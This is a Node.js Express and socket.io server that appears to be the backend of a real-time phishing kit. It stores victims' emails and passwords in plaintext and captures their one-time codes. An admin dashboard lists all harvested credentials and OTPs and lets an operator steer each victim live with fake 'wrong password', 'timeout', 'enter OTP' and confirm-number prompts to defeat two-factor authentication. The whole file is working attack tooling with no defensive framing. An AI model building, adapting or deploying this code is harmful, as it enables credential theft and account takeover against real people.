require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*", methods: ["GET", "POST"] } });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// HTML ROUTES
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'public', 'otp.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'otp.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/index.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));
app.get('/admin/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  connectionTimeoutMillis: 30000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true,
});

pool.connect((err) => {
  if (err) console.error('❌ DB error:', err.message);
  else console.log('✅ PostgreSQL connected');
});

const authenticateJWT = (req, res, next) => {
  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ error: 'No token' });
  const token = auth.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  socket.on('disconnect', () => console.log('🔌 Disconnected:', socket.id));
});

async function initDB() {
  try {
    console.log('📦 Initializing DB...');
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(10),
        status VARCHAR(50) DEFAULT 'pending',
        popup_type VARCHAR(20),
        popup_value TEXT,
        popup_id INTEGER DEFAULT 0,
        wrong_login_flag BOOLEAN DEFAULT FALSE,
        timeout_flag BOOLEAN DEFAULT FALSE,
        redirect_otp_flag BOOLEAN DEFAULT FALSE,
        wrong_otp_flag BOOLEAN DEFAULT FALSE,
        email_submitted_at TIMESTAMP DEFAULT NOW(),
        otp_submitted_at TIMESTAMP,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    const adm = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adm.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }
    console.log('✅ DB ready');
    return true;
  } catch (e) {
    console.error('❌ DB init error:', e.message);
    return false;
  }
}

// USER ENDPOINTS
app.post('/api/user/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
    await pool.query(`
      INSERT INTO users (email, password, status, popup_type, popup_value, wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag, email_submitted_at)
      VALUES ($1, $2, 'pending', NULL, NULL, FALSE, FALSE, FALSE, FALSE, NOW())
      ON CONFLICT (email) DO UPDATE SET
        password = EXCLUDED.password, status = 'pending', popup_type = NULL, popup_value = NULL,
        wrong_login_flag = FALSE, timeout_flag = FALSE, redirect_otp_flag = FALSE, wrong_otp_flag = FALSE,
        otp = NULL, email_submitted_at = NOW(), updated_at = NOW()
    `, [email, password]);
    io.emit('user-login', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/user/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    if (!/^[A-Za-z0-9]{5,6}$/.test(otp)) return res.status(400).json({ error: 'OTP must be 5-6 alphanumeric characters' });
    const r = await pool.query(
      `UPDATE users SET otp = $1, status = 'otp_submitted', otp_submitted_at = NOW(), updated_at = NOW() WHERE email = $2 RETURNING id`,
      [otp, email]
    );
    if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    io.emit('user-otp', { email, otp, timestamp: new Date() });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/user/status', async (req, res) => {
  try {
    const { email } = req.query;
    if (!email) return res.json({ notFound: true });
    const r = await pool.query(
      `SELECT status, popup_type, popup_value, popup_id, wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag FROM users WHERE email = $1`,
      [email]
    );
    if (r.rows.length === 0) return res.json({ notFound: true });
    res.json({ email, ...r.rows[0] });
  } catch (e) { res.json({ notFound: true }); }
});

app.post('/api/user/clear-flags', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query(
      `UPDATE users SET wrong_login_flag = FALSE, timeout_flag = FALSE, wrong_otp_flag = FALSE WHERE email = $1`,
      [email]
    );
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

// ADMIN ENDPOINTS
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
    const r = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (r.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
    const token = jwt.sign({ id: r.rows[0].id, email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
    res.json({ success: true, token });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const r = await pool.query(`
      SELECT id, email, password, otp, status, popup_type, popup_value, popup_id,
             wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag,
             email_submitted_at, otp_submitted_at, created_at, updated_at
      FROM users ORDER BY created_at DESC
    `);
    res.json(r.rows);
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET wrong_login_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
    io.emit('user-control', { email, action: 'wrong-login' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/timeout', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET timeout_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
    io.emit('user-control', { email, action: 'timeout' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/send-to-otp', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET redirect_otp_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
    io.emit('user-control', { email, action: 'send-to-otp' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/wrong-otp', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET wrong_otp_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
    io.emit('user-control', { email, action: 'wrong-otp' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/success', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query(`UPDATE users SET status = 'success', updated_at = NOW() WHERE email = $1`, [email]);
    io.emit('user-control', { email, action: 'success' });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/yes', authenticateJWT, async (req, res) => {
  try {
    const { email, number } = req.body;
    if (!email || !number) return res.status(400).json({ error: 'Email and number required' });
    const r = await pool.query(
      `UPDATE users SET popup_type = 'yes', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW() WHERE email = $2 RETURNING popup_id`,
      [String(number), email]
    );
    if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    io.emit('popup-update', { email, popup_type: 'yes', popup_value: String(number), popup_id: r.rows[0].popup_id });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.post('/api/admin/text', authenticateJWT, async (req, res) => {
  try {
    const { email, text } = req.body;
    if (!email || !text) return res.status(400).json({ error: 'Email and text required' });
    const r = await pool.query(
      `UPDATE users SET popup_type = 'text', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW() WHERE email = $2 RETURNING popup_id`,
      [text, email]
    );
    if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    io.emit('popup-update', { email, popup_type: 'text', popup_value: text, popup_id: r.rows[0].popup_id });
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

// Admin action: Cancel popup (hide YES/TEXT popup on user side)
app.post('/api/admin/cancel-popup', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    const r = await pool.query(`
      UPDATE users
      SET popup_type = NULL, popup_value = NULL, updated_at = NOW()
      WHERE email = $1
      RETURNING popup_id
    `, [email]);

    if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });

    io.emit('popup-cancel', { email, popup_id: r.rows[0].popup_id });
    console.log('❌ Popup cancelled for:', email);
    res.json({ success: true });
  } catch (e) {
    console.error('❌ Cancel popup error:', e.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/delete-user', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    const r = await pool.query('DELETE FROM users WHERE email = $1 RETURNING id', [email]);
    if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    io.emit('user-deleted', { email });
    console.log('🗑️ User deleted:', email);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.use((err, req, res, next) => {
  console.error('❌ Unhandled:', err);
  res.status(500).json({ error: 'Server error' });
});

const PORT = process.env.PORT || 3000;

initDB().then((ok) => {
  if (ok) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`🚀 Server on port ${PORT}`);
      console.log(`🔗 User: /`);
      console.log(`🔗 Admin: /admin`);
      console.log(`🔗 Dashboard: /admin/dashboard`);
    });
  } else {
    process.exit(1);
  }
});

process.on('SIGINT', () => { pool.end(() => process.exit(0)); });
process.on('SIGTERM', () => { pool.end(() => process.exit(0)); });